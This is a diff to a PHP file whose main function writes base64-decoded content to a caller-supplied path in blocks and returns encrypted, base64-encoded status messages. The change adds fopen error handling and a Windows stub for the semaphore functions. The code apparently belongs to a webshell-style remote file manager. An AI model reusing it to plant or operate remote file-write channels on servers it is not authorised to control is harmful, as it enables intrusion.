@@ -207,7 +207,7 @@ function main($mode, $path = ".", $hash = "", $blockIndex = "", $blockSize = "",
                 $_SESSION["update." . $path] = $f;
                 session_write_close();
             }*/
-
+            hookSemGetForWindows();
             $semRes = sem_get(1000, 1, 0666, 0); // get the resource for the semaphore
 
             if (sem_acquire($semRes)) { // try to acquire the semaphore. this function will block until the sem will be available
@@ -216,6 +216,14 @@ function main($mode, $path = ".", $hash = "", $blockIndex = "", $blockSize = "",
                     touch($path);
                 }
                 $f = fopen($path, "rb+");
+                if ($f===false)
+                {
+                sem_release($semRes);
+                	  $result["status"] = base64_encode("fail");
+                      $result["msg"] = base64_encode(error_get_last()["message"]);
+                      echo encrypt(json_encode($result));
+                      return;
+                }
                 fseek($f, (int)$blockIndex * (int)$blockSize, SEEK_SET);
                 fwrite($f, base64_decode($content));
                 fclose($f);
@@ -5668,3 +5676,21 @@ EOD;
     }
 }
 
+function hookSemGetForWindows()
+{
+    if(!function_exists("sem_get"))
+{
+    function sem_get($a,$b,$c,$d)
+    {
+        return true;
+    }
+    function sem_release($a)
+    {
+
+    }
+    function sem_acquire($a)
+    {
+        return true;
+    }
+}
+}
